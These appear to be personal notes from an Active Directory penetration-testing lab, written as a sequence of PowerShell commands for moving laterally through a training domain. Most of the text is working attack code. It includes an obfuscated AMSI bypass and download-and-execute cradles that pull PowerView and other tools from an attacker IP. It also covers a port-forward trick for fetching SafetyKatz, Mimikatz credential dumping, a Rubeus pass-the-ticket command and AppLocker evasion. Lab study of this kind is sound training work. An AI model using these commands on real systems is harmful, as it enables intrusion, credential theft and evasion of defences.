```powershell
iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb)
```

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```powershell
iex(iwr 'http://172.16.100.48/PowerView.ps1' -useb)
iex(iwr 'http://172.16.100.48/Invoke-SessionHunter.ps1' -useb)
iex(iwr 'http://172.16.100.48/Find-PSRemotingLocalAdminAccess.ps1' -useb)
```

You must have administrator access to list sessions - netexec equivalent
```powershell
Find-DomainUserLocation
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose

winrs -r:dcorp-mgmt cmd /c "set computername && set username"
$null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
```

### Lateral 1
Review AppLocker settings
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Add port forward to machine to forwards to webserver - downloading executable is bad
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
```

Download from local loopback
```powershell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

Note down the `aes256_hmac` and the cleartext credentials 
Use Rubues on attacking machine
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

This will create a logon type 9 so the new credentials will only be used when accessing domain resources

### Lateral 2 
Review AppLocker settings
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Copy to AppLocker safe folder - can't dot source
```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

.\Invoke-MimiEx-keys.ps1
.\Invoke-MimiEx-vault.ps1

& 'C:\Program Files\Invoke-MimiEx-keys.ps1'
& 'C:\Program Files\Invoke-MimiEx-vault.ps1'
```

Use `runas` to open cmd 
```powershell
runas /user:dcorp\svcadmin /netonly cmd
```